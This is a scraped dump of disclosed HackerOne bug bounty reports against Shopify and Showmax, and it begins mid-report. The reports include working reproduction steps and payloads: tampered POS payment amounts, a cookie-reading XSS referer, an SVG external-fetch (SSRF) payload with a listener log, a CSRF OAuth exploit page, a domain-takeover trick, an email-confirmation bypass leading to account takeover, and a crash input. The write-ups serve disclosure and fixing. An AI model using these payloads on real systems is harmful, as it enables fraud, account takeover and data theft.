There are four  values which interest us here: amount, amount_in, amount_rounding and amount_out. Those control how much the client is charged. They should follow the formula amount = amount_in - amount_rounding - amount_out. amount  should always remain the price of the cart.
amount_in is how much is charged from the client. amount_out is how much is taken from the shop. Looks like amount_rounding is a number which is not taken from anyone and is in fact some in-fact-rounding-value.
Some of these values allow negative values which broadens our possibilities. Let's see how it works. 
Steps To Reproduce:
You would need PoS in your show installed and installed on your phone (I used iphone with jailbreak to proxy data into Burp). https://apps.shopify.com/shopify-pos.

NOTE: I have used the test store to work with the payments. In real case this might work differently, but since I couldn't find a way to approve that, I decided to submit it nonetheless.

Create a new order with an item. I will be using a $1.09 dummy item from my shop. Now start the checkout process and select credit card as a payment source.
Image F1176221: photo_2021-01-29_04-28-29.jpg 90.35 KiBZoom in Zoom out Copy Download
Image F1176222: photo_2021-01-29_04-28-28.jpg 97.53 KiBZoom in Zoom out Copy Download
Enter card details and be ready to intercept this request.
Image F1176223: photo_2021-01-29_04-28-26.jpg 105.83 KiBZoom in Zoom out Copy Download
We are looking for the similar payments.json request:
Image F1176220: 2021-01-29_04-20.png 146.35 KiBZoom in Zoom out Copy Download
Code 455 BytesWrap lines Copy Download1POST /admin/api/unstable/checkouts/5788adb325c4824f193d08daf474f21a/payments.json HTTP/1.1
2Host: c0rv4x2.myshopify.com
3...
4
5{""payment"":{""amount"":1.09,""user_id"":64582418454,""amount_rounding"":0,""charge"":true,""card_source"":""manual"",""amount_out"":0,""location_id"":52512587798,""session_id"":""east-fbc4aa9a711b9a5f13a0a76e9bd7c879"",""amount_tip"":0,""amount_in"":1.09,""auto_finalize"":false,""device_id"":2131722262,""unique_token"":""4DA811C1-4824-4451-B576-290137624B1A""}}
Change amount_in to 2.09 (1 USD more than the current price) amount_rounding to -1.0 (retracting that one dollar to make our equation from the begging of this report true).
Code 458 BytesWrap lines Copy Download1POST /admin/api/unstable/checkouts/5788adb325c4824f193d08daf474f21a/payments.json HTTP/1.1
2Host: c0rv4x2.myshopify.com
3...
4
5{""payment"":{""amount"":1.09,""user_id"":64582418454,""amount_rounding"":-1.0,""charge"":true,""card_source"":""manual"",""amount_out"":0,""location_id"":52512587798,""session_id"":""east-fbc4aa9a711b9a5f13a0a76e9bd7c879"",""amount_tip"":0,""amount_in"":2.09,""auto_finalize"":false,""device_id"":2131722262,""unique_token"":""4DA811C1-4824-4451-B576-290137624B1A""}}
Image F1176224: photo_2021-01-29_04-28-24.jpg 105.53 KiBZoom in Zoom out Copy Download
Similar behaviour
Similar behaviour is possible if we set amount_out to a non negative value (which would mean the shop is losing money).
Impact
Potentially manipulate customers and shops money without their conscent5 attachments:F1176220: 2021-01-29_04-20.pngF1176221: photo_2021-01-29_04-28-29.jpgF1176222: photo_2021-01-29_04-28-28.jpgF1176223: photo_2021-01-29_04-28-26.jpgF1176224: photo_2021-01-29_04-28-24.jpg",https://hackerone.com/reports/1089978,Ontario,Canada,Ottawa,2021,1,29,1,30
Shopify,5001-10000,0.0,200m-1b,$500.00,Low,2.4,Cross-Site Request Forgery (CSRF),[h1-2102] Wholesale - CSRF to Generate Invitation Token for a Customer and Move Customer to Invited Status,"rhynorater  submitted a report to Shopify.Jan 31st (2 years ago)Summary:
There is a CSRF vulnerability in the Wholesale application to generate an invitation token for a user and move that user to invited status.
Steps To Reproduce:

Log in to Shopify and configure Wholesale
Add a price list
Add a customer with the tag wholesale
Adjust the pricelist to include the user with the wholesale tag
At this point you should see the user in the customer section (see figure 1)
Now, navigate to https://poc.rhynorater.com/wholesaleShopify/CSRF.html
Wait 30 seconds (for good measure)
Refresh the customer page and note that the user is in the status of invited

Figure 1
Image F1178635: Screenshot_from_2021-01-31_22-06-15.png 51.01 KiBZoom in Zoom out Copy Download
Supporting Material/References:
Impact
Move customer to invited status and generated invite link.1 attachment:F1178635: Screenshot_from_2021-01-31_22-06-15.png",https://hackerone.com/reports/1091209,Ontario,Canada,Ottawa,2021,1,31,13,14
Shopify,5001-10000,0.0,200m-1b,"$3,100.00",Medium,4.2,Incorrect Permission Assignment for Critical Resource,[h1-2102] FQDN takeover on all Shopify wholesale customer domains by trailing dot (RFC 1034),"intidc  submitted a report to Shopify.Jan 24th (2 years ago)Summary:
Due to a missing domain format check in Shopify's wholesale functionality, it is possible to serve arbitrary content on the customer's domain through existing DNS records already configured to work with Shopify. I only tested with domains that I own but as far as I understand, this would work with just any domain or subdomain that it set up to work with Shopify wholesale.
This exposes Shopify wholesale customers to several risk, similar to classic subdomain takeovers:

Loss of domain integrity: attackers could host malicious content on the customer's domain
Phishing attacks: attackers could use login/sign up page to capture PII and 
Scams: scammers could recreate trusted wholesale shops, host them under the official domain and collect money

Steps To Reproduce:

For the sake of this proof of concept, we'll take over my test wholesale shop at https://shop.inti.io/accounts/sign_in, which has it's CNAME set to wholesale-shops.shopifyapps.com (as requested by the documentation):

Image F1170259: Screenshot_2021-01-24_at_18.50.28.png 74.76 KiBZoom in Zoom out Copy Download
In real-life attacks, attackers could perform reverse CNAME lookups through e.g. Alien Vault's OTX.

Now log in as attacker and try to add shop.inti.io as a domain name in your preferences. This will not work, because there's already a store attached to it:

Image F1170265: Screenshot_2021-01-24_at_19.00.21.png 140.03 KiBZoom in Zoom out Copy Download

Attacker now sits down, takes a nip of coffee and reads RFC 1034. Attacker notices the following:

Code 556 BytesWrap lines Copy Download1Since a complete domain name ends with the root label, this leads to a
2printed form which ends in a dot.  We use this property to distinguish between:
3
4   - a character string which represents a complete domain name
5     (often called ""absolute"").  For example, ""poneria.ISI.EDU.""
6
7   - a character string that represents the starting labels of a
8     domain name which is incomplete, and should be completed by
9     local software using knowledge of the local domain (often
10     called ""relative"").  For example, ""poneria"" used in the
11     ISI.EDU domain.
In theory, all domain names should have a trailing dot at the end, but since literally no one does that both a domain name with and without a trailing dot will essentially result in the same records being served. Since Shopify does not implement DNS-based verification and only checks whether the record is already present, we can enter the trailing dot version of the domain name to bypass this check:
Image F1170267: Screenshot_2021-01-24_at_19.06.42.png 123.02 KiBZoom in Zoom out Copy Download
Image F1170268: Screenshot_2021-01-24_at_19.06.49.png 109.85 KiBZoom in Zoom out Copy Download

Now attacker waits for a few minutes to allow the DNS / SSL changes to propagate. Depending on your browser's cache, it can take a while, but normally after a few minutes the malicious shop should pop up at https://shop.inti.io./accounts/sign_in.

Final results
Real store: https://shop.inti.io/accounts/sign_in
Image F1170269: Screenshot_2021-01-24_at_19.10.58.png 220.03 KiBZoom in Zoom out Copy Download
Hijacked store: https://shop.inti.io./accounts/sign_in
Image F1170270: Screenshot_2021-01-24_at_19.10.51.png 10.75 MiBZoom in Zoom out Copy Download
Note to triagers - I have released shop.inti.io. in my shopify so you can claim it and reproduce. This means that the hijacked store is no longer accessible.
This could be done by anyone for any wholesale connected store, without having access to the DNS records.
Recommended fix
Do not consider trailing dots when checking whether domain names already exist on your back-end
Supporting Material/References:
*Trailing Dots in Domain Names, CHESHIRE S., http://www.dns-sd.org/trailingdotsindomainnames.html

DOMAIN NAMES - CONCEPTS AND FACILITIES (RFC1034), MOCKAPETRIS P (Network Work Group), https://www.ietf.org/rfc/rfc1034.txt

Impact
This exposes Shopify wholesale customers to several risk, similar to classic subdomain takeovers:

Loss of domain integrity: attackers could host malicious content on the customer's domain
Phishing attacks: attackers could use login/sign up page to capture PII and 
Scams: scammers could recreate trusted wholesale shops, host them under the official domain and collect money
6 attachments:F1170259: Screenshot_2021-01-24_at_18.50.28.pngF1170265: Screenshot_2021-01-24_at_19.00.21.pngF1170267: Screenshot_2021-01-24_at_19.06.42.pngF1170268: Screenshot_2021-01-24_at_19.06.49.pngF1170269: Screenshot_2021-01-24_at_19.10.58.pngF1170270: Screenshot_2021-01-24_at_19.10.51.pngSummary by intidcCheck out my show and tell: https://youtu.be/LSwWQPQ5IG8",https://hackerone.com/reports/1086108,Ontario,Canada,Ottawa,2021,1,24,18,18
Shopify,5001-10000,0.0,200m-1b,"$2,900.00",Medium,5.45,Information Disclosure,[Information Disclosure] Amazon S3 Bucket of Shopify Ping (iOS) have public access of other users image,"justmek  submitted a report to Shopify.Oct 29th (2 years ago)Hello Shopify, when testing Shopify Ping share image function, I discovered an Amazon S3 bucket which has public access which allows an attacker to view all the image of other merchant & users.
Steps To Reproduce:

Install Shopify Ping on your phone then enable Shopify Chat for your store.
Go to your Shopify Store and start chatting as a customer. ███
Log in to Staff account on Shopify Ping and click on send image ████████
Back to Shopify Store as Customer and inspect the website code, you will find the URL of image ██████████ https://ping-api-production.s3.us-west-2.amazonaws.com/oks██████
Now visit https://ping-api-production.s3.us-west-2.amazonaws.com, you can view all images of other stores. █████████

Impact
Using this Bucket access, a hacker can steal all private images of other stores and the user who shared through Shopify Ping.",https://hackerone.com/reports/1021906,Ontario,Canada,Ottawa,2020,10,29,15,37
Shopify,5001-10000,0.0,200m-1b,"$15,000.00",Critical,9.5,None,[Part II] Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation,"ngalog  submitted a report to Shopify.Feb 14th (3 years ago)Summary
In #791775, I submitted a bug at Sunday 5pm Canada time, it was triaged two hours later, and I got the temp fix message at around 3am the next day in Canada time. Truly awesome, the next day I retested after the first fix, and found that I

Cannot receive the email confirmation in the email used to sign up
Cannot integrate across stores/partner even they share the same email address after confirming them

And the report was later resolved after I verified the fix.
For some reason, I decided to test again to see what's something new that I can find.
Then I found user can change their email prior to receiving the verification message on their original email. i.e. the same technique, I don't know what went wrong in my first retest, but Shopify security and engineering team again showed their professionalism, quickly resolving the second comments I left in ~3.5 hrs.
And when I thought this is the end of story, I later received a comment asking me to open a new report about the second retest, and here I am writing this report.
Thanks,
Ron
Impact
.jack_mccracken Shopify staff  closed the report and changed the status to Resolved. Feb 14th (3 years ago)Hi @ngalog,
Thank you for the report. As mentioned, we consider this to be a separate issue from #791775 due to it having a separate root cause. As the issue itself was resolved in #791775, we will close this report as Resolved.Shopify  rewarded ngalog with a $15,000 bounty. Feb 14th (3 years ago)Hi again @ngalog.
Because this turned out to be a separate bug from #791775 with a different root cause, we're awarding a separate bounty. This bug also falls into the ""Privilege escalation to shop owner"" category for Shopify Core, and only affected user accounts which had not yet adopted our single login system. For those reasons, we're awarding a bounty of $15,000.
Thanks again for the great report. We look forward to hearing from you again soon. Happy hacking!shopify-peteryaworski   requested to disclose this report. Apr 1st (3 years ago)ngalog   agreed to disclose this report. Apr 1st (3 years ago)  This report has been disclosed. Apr 1st (3 years ago)",https://hackerone.com/reports/796808,Ontario,Canada,Ottawa,2020,2,14,17,37
Shopify,5001-10000,0.0,200m-1b,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,[persistent cross-site scripting] customers can target admins,"akhil-reni  submitted a report to Shopify.Apr 11th (8 years ago)hello,
Let's say a shop has a checkout button.
when we click buy now , you will be redirected to https://madamcury.myshopify.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie);
Keep an eye on referer parameter in URL
referer=javascript:alert(document.cookie);
A customer can set referer to a xss payload, and the admin will see a referer parameter in his control panel, if the admin clicks on the link the xss triggered. (POC ATTACHED)
Steps to reproduce

create a buy now button
when you click buy now button , you will be redirected to https://madamcury.myshopify.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie);
set referer parameter in url to javascript:alert(document.cookie);
finish the order
now from admin account login into admin panel,
click the referer link , you will see a xss triggered.

All admins, users of a shop can be targeted with this attack.
Tell me if you any issues reproducing the issue :)
regards
Wesecureapp",https://hackerone.com/reports/55842,Ontario,Canada,Ottawa,2015,4,11,7,51
Shopify,5001-10000,0.0,200m-1b,"$15,000.00",Critical,9.5,None,Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO,"ngalog  submitted a report to Shopify.Feb 9th (3 years ago)I told Pete I would take a look at Spotify, hi Pete.
Summary
It's possible to take over any store account through bypassing the email confirmation step in .myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in .myshopify.com, user is able to integrate with other Shopify store that shares the same email address by setting a master password for all of the stores(if the owner hasn't integrated before), effectively taking over every Shopify stores by knowing just the owner's email address.
After signing up a new Shopify instance in https://www.shopify.com/pricing and start the free trial, user can change their email address to a new email address before confirming the one they used to sign up.
The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up.
And the result is user can confirm arbitrary email address. And the next step is taking over other user's Shopify instance by taking advantage of the SSO.
Quick check
If you check https://h31ngalog.myshopify.com/ and see the email address of the owner, it is ngalog@hackerone.com, which I obviously would never be able to validate otherwise
Image F711349: Screenshot_2020-02-10_at_12.13.19_PM.png 206.85 KiBZoom in Zoom out Copy Download
steps to reproduce

Visit https://www.shopify.com/pricing and signup a free trial with an email address, say attacker@gmail.com that you can receive emails
after entering the fields to enter the store, on top right corner, click your name and go to Your Profile
change your email to someone that you want to takeover, for example yaworsk@hackerone.com and click save
All done now, grab a coffee, sit back and relax, watch some YouTube videos and wait for an email to go to your email attacker@gmail.com
The email that you are waiting for is from mailer@shopify.com, and the format should look like this Image F711348: Screenshot_2020-02-10_at_12.18.01_PM.png 145.66 KiBZoom in Zoom out Copy Download
Click the link and you should see your email has been updated to yaworsk@hackerone.com

Reason?
Email system mistakenly send the confirmation link of yaworsk@hackerone.com to attacker@gmail.com because attacker@gmail.com is the one that is saved on system, and the email system didn't notice the confirmation link has been updated to yaworsk@gmail.com, and should not be sent to attacker@gmail.com
SSO account takeover

now we have the ability to confirm arbitrary email, then we can takeover other stores
On top right corner of you-shop.myshopify.com click your name then click profile, you should see a box that says, you have other two accounts in Shopify, want to integrate them together
click yes, then just follow the instructions then you will be able to takeover all other stores by changing the master password for all of the stores under that email address.

Impact
Ability to confirm arbitrary email on *.myshopify.com and leverage SSO to set master password for all other stores under the same password2 attachments:F711348: Screenshot_2020-02-10_at_12.18.01_PM.pngF711349: Screenshot_2020-02-10_at_12.13.19_PM.pngjack_mccracken Shopify staff  changed the status to Triaged. Feb 10th (3 years ago)Hi @ngalog,
Thank you for the report. Our engineering team has validated your finding and is working on a fix.ngalog   posted a comment. Feb 10th (3 years ago)I wasn't using the most accurate words while describing the impact, it could be more than just be taking over other stores , but also the partner account as well since they are all tied togetherjack_mccracken Shopify staff  posted a comment. Feb 10th (3 years ago)Hi @ngalog,
Thanks for the additional context. We will make sure to take all discovered impact into account when deciding on a bounty for this report. We deployed a temporary fix for this issue tonight, and you should no longer be able to reproduce it. We will keep you updated as we continue to work on a more permanent fix. Thanks again for reporting to Shopify!ngalog   posted a comment. Feb 10th (3 years ago)@jack_mccracken 
Thanks for the impressive quick turnaround! I just checked and I can't reproduce anymore.

Cannot receive the email confirmation in the email used to sign up
Cannot integrate across stores/partner even they share the same email address after confirming them

I think the fix is good.
Thanks,
Ronjack_mccracken Shopify staff  closed the report and changed the status to Resolved. Feb 11th (3 years ago)Hi @ngalog,
Thanks again for the great report! As this issue is no longer reproducible, we're closing the report as resolved. You should hear from us regarding a bounty in the next couple of days.ngalog   posted a comment. Feb 11th (3 years ago)Hey this is weird, it is working again now, I don’t know what went wrong last time I verify it. I just used the shop h41ngalog to confirm email yaworsk@hackerone.com using the same technique 
Image F713514: CBDB37A2-2C74-461E-8961-AA9BBA620021.png 591.98 KiBZoom in Zoom out Copy Download1 attachment:F713514: CBDB37A2-2C74-461E-8961-AA9BBA620021.pngjack_mccracken Shopify staff  reopened this report. Feb 12th (3 years ago)Hey @ngalog,
Thanks for checking the fix! We will reopen this report while we investigate.jack_mccracken Shopify staff  changed the status to Triaged. Feb 12th (3 years ago)jack_mccracken Shopify staff  closed the report and changed the status to Resolved. Feb 12th (3 years ago)Hi @ngalog,
We've deployed a fix for this second case. The vulnerability still existed if you were able to change the email prior to the initial email verification message going out. We appreciate you re-testing the report and will get back to you soon about a bounty.ngalog   posted a comment. Feb 12th (3 years ago)@jack_mccracken 
I tried to change the email prior to the initial email verification message going out, and I still get the email message sent to the email that was used to sign up, but this time after clicking the link, it would return an error saying your email can't be changed because of an error etc...
i.e. I am not able to reproduce now.
Thanks,
Ronjack_mccracken Shopify staff  posted a comment. Feb 14th (3 years ago)Hi @ngalog,
Thank you for the great report and for your patience while we decided on a bounty. In this issue, the first behaviour you reported and the behaviour you noticed after the report was resolved have two separate root causes. For this reason, we decided it would be most fair to award these two issues separately. 
We would like to ask that you open a second report about the behaviour where the user changes their email prior to receiving the verification message on their original email. Let us know when you have done this and we will process the bounty.
We appreciate you hacking on Shopify, and look forward to continuing to work with you in the future!Shopify  rewarded ngalog with a $15,000 bounty. Feb 14th (3 years ago)Hi again @ngalog.
We're awarding a $15,000 bounty under the ""Privilege escalation to shop owner"" category for Shopify Core. An important mitigating factor was that this bug only affected user accounts which had not yet adopted our single login system. Most of our merchants already authenticate using the single login system. For that reason, we've chosen to place the bounty in the middle of the range for privilege escalation.
Thanks again for the great report. We look forward to hearing from you again soon. Happy hacking!ngalog   posted a comment. Feb 15th (3 years ago)Thank you very much for the bounty, and also the quick response time and the conversation here, and the 100% transparency in this report. Really enjoy working with Shopify team.
No one can complain anything if they can get two bounties for one bug =Pshopify-peteryaworski   requested to disclose this report. Apr 1st (3 years ago)ngalog   agreed to disclose this report. Apr 1st (3 years ago)  This report has been disclosed. Apr 1st (3 years ago)Shopify  rewarded ngalog with a $1,000 bonus. Dec 21st (2 years ago)Hi @ngalog,
We wanted to thank our most impactful 2020 hackers, based on the number of valid reports and bounties earned. Congratulations on making that list.
As a special thank you, we are awarding you a bonus of $1000 and have recorded this video to ensure you know how much we appreciate your time and effort. Thank you for hacking with us. We will also be sending you a special thank you in the new year so please make sure your address information is up to date in HackerOne.
We hope you have a safe and happy holiday season. Happy Hacking!
https://www.youtube.com/watch?v=pTw7tfKfLjU&list=PLr8d6l1sJufd1ZlMU0WvKd-SUVvB7xI6V&index=3ngalog   posted a comment. Dec 21st (2 years ago)Thank you team! I didn't see this coming and was really happy watching the video. It's good to see everyone in person (sort of) and I'm equally thankful to work with Shopify team!
I wish everyone has a happy holiday, and this certainly has set the bar for other bug bounty programs, in a good way :PShopify  rewarded ngalog with swag. Jan 8th (2 years ago)",https://hackerone.com/reports/791775,Ontario,Canada,Ottawa,2020,2,9,23,25
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),SVG parser loads external resources on image upload,"ogig  submitted a report to Shopify.Nov 3rd (7 years ago)Uploading SVG that include
Code 52 BytesWrap lines Copy Download1 <image xlink:href=""http://example.com/?evil=var"" />
will cause the server side parser to try to fetch external resources.
I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 
Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 
Code 198 BytesWrap lines Copy Download1Listening on [0.0.0.0] (family 0, port 3001)
2Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
3GET /?evil=var HTTP/1.0
4Host: 37.139.18.151:3001
5Accept-Encoding: gzip",https://hackerone.com/reports/97501,Ontario,Canada,Ottawa,2015,11,3,20,9
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Information Disclosure,Fetching external resources through svg images,"detroitsmash  submitted a report to Shopify.Jun 2nd (6 years ago)Hi,
I found the exactly same bug #97501 at https://app.shopify.com/services/partners/api_clients/<APP-ID> when uploading the svg image on app icon.
Steps to reproduce it

Make a new app at https://app.shopify.com/services/partners/api_clients
Goto app setting https://app.shopify.com/services/partners/api_clients/<APP-ID>
Now upload the attached svg image and change the xlink with your owner.
Save changes and check your server log. 

Image F97509: Screenshot_from_2016-06-02_22_57_08.png 12.13 KiBZoom in Zoom out Copy Download
Thanks2 attachments:F97508: poc.svgF97509: Screenshot_from_2016-06-02_22_57_08.pngSummary by detroitsmashMoving on :)",https://hackerone.com/reports/142709,Ontario,Canada,Ottawa,2016,6,2,17,29
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Violation of Secure Design Principles,CSRF token fixation in facebook store app that can lead to adding attacker to victim acc ,"defmax  submitted a report to Shopify.Apr 11th (8 years ago)hey guys
i just found  an csrf token  fixation in facebook store app  which is an offical  shopify app 
link >> https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store
The CSRF bug which connects attacker's Facebook account to victim's shopify  account. This is done by exploiting 'Connect with Facebook' function.
When using 'Connect with Facebook' function. A request is sent to facebook to authorize the shopify app. After authorizing a 'access token' is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token ""state parameter "" 
here state parameter is getting fixed here 
1st oauth request 
https://graph.facebook.com/oauth/authorize?client_id=410312912374011&display=popup&redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated&response_type=code&scope=manage_pages+email&state=c2f449f2df5ee64df6173702846bce72e3a57319
then when it autorized , we will get this  get !
https://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw&state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_
now how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible 
exploit code 
Code 165 BytesWrap lines Copy Download1<html>
2<body>
3<a href=https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token ]&state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_>
4</body>
5</html>
hope this bug will be fixed soonSummary by defmaxhaha sorry for the template @pranav_hivarekar:p",https://hackerone.com/reports/55911,Ontario,Canada,Ottawa,2015,4,11,14,6
shopify-scripts,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Denial of Service,Invalid memory access in `mrb_str_format`,"haquaman  submitted a report to shopify-scripts.Dec 15th (6 years ago)Only affects mruby because mruby-engine doesn't have sprintf. I should have filed this last friday before I went to the pub, so missed out on higher bounties. Oh well!
Crash file is:
Code 19 BytesWrap lines Copy Download1sprintf(""%1$*c"", 0)
Crash is:
Code 1.52 KiBWrap lines Copy Download1$ lldb ./bin/mruby ../crash.rb
2(lldb) target create ""./bin/mruby""
3Current executable set to './bin/mruby' (x86_64).
4(lldb) settings set -- target.run-args  ""../crash.rb""
5(lldb) r
6Process 69381 launched: './bin/mruby' (x86_64)
7Process 69381 stopped
8* thread #1: tid = 0x1d8935, 0x00007fff9969ec49 libsystem_platform.dylib`_platform_bzero$VARIANT$Haswell + 41, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x100700000)
9    frame #0: 0x00007fff9969ec49 libsystem_platform.dylib`_platform_bzero$VARIANT$Haswell + 41
10libsystem_platform.dylib`_platform_bzero$VARIANT$Haswell:
11->  0x7fff9969ec49 <+41>: rep
12    0x7fff9969ec4a <+42>: stosb  %al, %es:(%rdi)
13    0x7fff9969ec4b <+43>: movq   %rdx, %rax
14    0x7fff9969ec4e <+46>: popq   %rbp
15(lldb) up
16frame #1: 0x00007fff96fbfa6b libsystem_c.dylib`__memset_chk + 22
17libsystem_c.dylib`__memset_chk:
18    0x7fff96fbfa6b <+22>: movq   %rbx, %rax
19    0x7fff96fbfa6e <+25>: addq   $0x8, %rsp
20    0x7fff96fbfa72 <+29>: popq   %rbx
21    0x7fff96fbfa73 <+30>: popq   %rbp
22(lldb) up
23frame #2: 0x000000010004a155 mruby`mrb_str_format(mrb=0x0000000100300390, argc=2, argv=0x000000010100f020, fmt=mrb_value @ 0x00007fff5fbfc800) + 11829 at sprintf.c:693
24   690            FILL(' ', width-1);
25   691          }
26   692          else {
27-> 693            FILL(' ', width-1);
28   694            CHECK(n);
29   695            memcpy(buf+blen, c, n);
30   696            blen += n;
31(lldb) p width
32(mrb_int) $0 = 0
33(lldb) q
34Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y
35
Happens you have a positional width parameter passed to sprintf, with an argument of 0. 
A patch to fix is:
Code 438 BytesWrap lines Copy Download1diff --git a/mrbgems/mruby-sprintf/src/sprintf.c b/mrbgems/mruby-sprintf/src/sprintf.c
2index 696d093..8ed8b92 100644
3--- a/mrbgems/mruby-sprintf/src/sprintf.c
4+++ b/mrbgems/mruby-sprintf/src/sprintf.c
5@@ -618,8 +618,8 @@ retry:
6 
7       case '*':
8         CHECK_FOR_WIDTH(flags);
9-        flags |= FWIDTH;
10         GETASTER(width);
11+        flags |= FWIDTH;
12         if (width < 0) {
13           flags |= FMINUS;
14           width = -width;
Cheers,
Hugh",https://hackerone.com/reports/191328,Ontario,Canada,Ottawa,2016,12,15,7,52
Showmax,101-250,0.0,50m-100m,$200.00,Medium,5.45,Improper Authentication - Generic,bypass parental pin succesfully,abdulsec  submitted a report to Showmax.Mar 9th (2 years ago),https://hackerone.com/reports/1121169,Florida,United States,Vero Beach,2021,3,9,13,1
Showmax,101-250,0.0,50m-100m,"$1,200.00",High,7.95,Improper Authentication - Generic,Changing details of other users profile using UUID (IDOR),ehsahil  submitted a report to Showmax.Jan 5th (6 years ago),https://hackerone.com/reports/195996,Florida,United States,Vero Beach,2017,1,5,14,40
Showmax,101-250,0.0,50m-100m,$550.00,Medium,6.6,Open Redirect,Open Redirect in secure.showmax.com,ahmadbrainworks  submitted a report to Showmax.Dec 1st (3 years ago)Summary by ahmadbrainworkswrite-up: https://medium.com/@ahmadbrainworks/bug-bounty-how-i-earned-550-in-less-than-5-minutes-open-redirect-chained-with-rxss-8957979070e5,https://hackerone.com/reports/749338,Florida,United States,Vero Beach,2019,12,1,22,37
Showmax,101-250,0.0,50m-100m,"$2,000.00",High,7.95,Privilege Escalation,Parental Pin Bypass,lordjerry0x01  submitted a report to Showmax.Jan 13th (2 years ago),https://hackerone.com/reports/1077520,Florida,United States,Vero Beach,2021,1,13,8,2
Showmax,101-250,0.0,50m-100m,$128.00,No value,0.0,Violation of Secure Design Principles,Query string parameter modifications returned in page,"jackb898  submitted a report to Showmax.Jan 16th (5 years ago)NOTE BEFOREHAND: I KNOW it's not located on the core showmax.com domain, but that doesn't effect the applications of this and it still has the same risk.
Summary: At https://sso.showmax.com/auth/failure?message=, you can change the message parameter to any text and it will be returned on the page in a red box. This could lead to phishing and confusing users since the text is being returned within the actual website.
Description: You can take the URL https://sso.showmax.com/auth/failure?message= and change the ""message"" parameter to any text (and you can encode it with percent encoding) and it will be returned as text on the loaded page.
Platform(s) Affected: Tested in Chrome 63.0.3239.132 (Official Build) (64-bit), should work in most situations
User Identification:████████ but N/A
Steps To Reproduce:

Take the URL https://sso.showmax.com/auth/failure?message=
Change the message parameter text to anything
Copy and paste the new URL into a browser
You'll notice the text is returned clearly in a red box at the top of the loaded page

Supporting Material/References:
  I attached an image with an example payload.
Thanks,
Jack
Impact
An attacker could use this to phish and steal user accounts by setting it up with a convincing, percent-encoded message to redirect them to a site with a fake login that steals their information.
Example of an attacker payload: https://sso.showmax.com/auth/failure?message=%47%6F%20%74%6F%20%65%76%69%6C%2E%63%6F%6D
As you can see, at first glance this URL doesn't give away the text in the box, making it even more convincing and dangerous. A real attacker could obviously make a more convincing payload though that said something like my attached image.1 attachment:F254228: ba14f2b6badedcdd6d488be498b35446.pngShowmax  rewarded jackb898 with a $128 bounty. Jan 16th (5 years ago)You are absolutely right, that it is out of official scope. But we consider it valid comment, so I take a liberty to assign small bounty to thank you for your effort.krala   changed the status to Triaged. Jan 16th (5 years ago)krala   posted a comment. Jan 16th (5 years ago)Well, so the problem is coming from passing message from the Omniauth, which perfectly aligned with their documentation https://github.com/omniauth/omniauth/wiki#getting-started :(krala   closed the report and changed the status to Resolved. Jan 16th (5 years ago)jackb898   requested to disclose this report. Jan 16th (5 years ago)Are you ok with public disclosure of not?krala   agreed to disclose this report. Jan 16th (5 years ago)  This report has been disclosed. Jan 16th (5 years ago)",https://hackerone.com/reports/305082,Florida,United States,Vero Beach,2018,1,16,0,7
Showmax,101-250,0.0,50m-100m,$256.00,No value,0.0,Information Disclosure,Stored blind xss on showmax support team,mostafamamdoh  submitted a report to Showmax.Jan 20th (5 years ago),https://hackerone.com/reports/307485,Florida,United States,Vero Beach,2018,1,20,16,2
Showmax,101-250,0.0,50m-100m,$50.00,Medium,5.45,Information Disclosure,xmlrpc.php is publicly available at https://stories.showmax.com/xmlrpc.php,"mdakh404  submitted a report to Showmax.May 29th (about 1 year ago)Summary:
Greetings @Showmax, i found an xmlrpc.php file on  https://stories.showmax.com, it's publicly available and it accepts POST requests.
Description:
your site is a WordPress site based, xmlrpc.php is a file that is intended to make API calls between hosts, if it's enabled on a WordPress site with methods like pingback.ping and other methods as well; https://stories.showmax.com can be made as a part of a big botnet network to carry out DDoS attacks against other victim hosts.
Platform(s) Affected:
[website]  https://stories.showmax.com
Steps To Reproduce:

Send a POST request to https://stories.showmax.com/xmlrpc.php with the following snippet of code in the HTTP request body:

Code 167 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""utf-8""?> 
2<methodCall> 
3<methodName>demo.sayHello</methodName> 
4<params> 
5<param>
6<value>admin</value>
7</param> 
8</params> 
9</methodCall>

You should see this response:

Code 222 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2// HTTP Response Headers
3<?xml version=""1.0"" encoding=""UTF-8""?>
4<methodResponse>
5  <params>
6    <param>
7      <value>
8      <string>Hello!</string>
9      </value>
10    </param>
11  </params>
12</methodResponse> 

